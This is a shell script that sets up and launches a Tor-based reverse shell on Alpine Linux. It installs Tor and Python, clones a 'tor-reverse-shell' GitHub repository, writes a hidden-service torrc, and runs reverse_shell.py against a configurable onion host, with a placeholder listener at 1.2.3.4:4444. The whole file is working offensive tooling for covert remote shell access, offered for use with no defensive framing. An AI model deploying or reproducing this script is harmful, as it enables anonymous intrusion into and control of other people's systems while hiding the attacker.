#!/usr/bin/env sh
# https://github.com/tpaphysics/tor-reverse-shell/tree/main

#########################################
# Optional Environment Variables
#########################################
: "${TOR_TARGET_HOST:=my.onion.host}"
: "${TOR_TARGET_PORT:=8080}"
: "${LOCAL_LISTENER:=1.2.3.4:4444}"
: "${REPO_URL:=https://github.com/tpaphysics/tor-reverse-shell.git}"
: "${CLONE_DIR:=/opt/tor-reverse-shell}"
: "${HIDDEN_SERVICE_DIR:=/var/lib/tor/hidden_service}"

set -e  # Exit immediately on errors
echo "[INFO] Starting Tor Reverse Shell Setup..."

#########################################
# Step 1: Update Alpine and Install Dependencies
#########################################
echo "[INFO] Updating Alpine and installing dependencies..."
apk update && apk add --no-cache \
    tor \
    python3 \
    py3-pip \
    git \
    curl \
    bash \
    coreutils \
    libc6-compat || { echo "[ERROR] Failed to install dependencies!"; exit 1; }

# Ensure pip is up-to-date
pip3 install --upgrade pip --quiet

#########################################
# Step 2: Clone Repository
#########################################
echo "[INFO] Cloning the repository..."
if [ -d "$CLONE_DIR" ]; then
    rm -rf "$CLONE_DIR"
fi
git clone --depth 1 "$REPO_URL" "$CLONE_DIR" || { echo "[ERROR] Git clone failed!"; exit 1; }
cd "$CLONE_DIR"

#########################################
# Step 3: Install Python Dependencies
#########################################
echo "[INFO] Installing Python dependencies..."
if [ -f requirements.txt ]; then
    pip3 install --quiet -r requirements.txt || { echo "[ERROR] Failed to install Python dependencies!"; exit 1; }
fi

#########################################
# Step 4: Configure Tor Hidden Service
#########################################
echo "[INFO] Configuring Tor hidden service..."
mkdir -p "$HIDDEN_SERVICE_DIR"
chown -R tor:tor "$HIDDEN_SERVICE_DIR"
chmod 700 "$HIDDEN_SERVICE_DIR"

cat <<EOF > /etc/tor/torrc
Log notice stdout
DataDirectory /var/lib/tor
HiddenServiceDir $HIDDEN_SERVICE_DIR
HiddenServicePort $TOR_TARGET_PORT 127.0.0.1:$TOR_TARGET_PORT
EOF

#########################################
# Step 5: Start Tor and Wait for Initialization
#########################################
echo "[INFO] Starting Tor service..."
tor > /dev/null 2>&1 &
TOR_PID=$!

echo "[INFO] Waiting for Tor to initialize..."
for i in $(seq 1 10); do
    if [ -f "$HIDDEN_SERVICE_DIR/hostname" ]; then
        ONION_HOSTNAME=$(cat "$HIDDEN_SERVICE_DIR/hostname")
        echo "[INFO] Tor hidden service is available at: $ONION_HOSTNAME"
        break
    fi
    sleep 1
done

if [ ! -f "$HIDDEN_SERVICE_DIR/hostname" ]; then
    echo "[ERROR] Tor failed to create the hidden service hostname!"
    kill $TOR_PID
    exit 1
fi

#########################################
# Step 6: Start the Tor-Based Reverse Shell
#########################################
export TOR_TARGET_HOST="$TOR_TARGET_HOST"
export TOR_TARGET_PORT="$TOR_TARGET_PORT"
export LOCAL_LISTENER="$LOCAL_LISTENER"

echo "[INFO] Starting the Tor-based reverse shell..."
if [ -f "reverse_shell.py" ]; then
    exec python3 reverse_shell.py --host "$TOR_TARGET_HOST" --port "$TOR_TARGET_PORT"
else
    echo "[ERROR] reverse_shell.py not found in repository directory."
    kill $TOR_PID
    exit 1
fi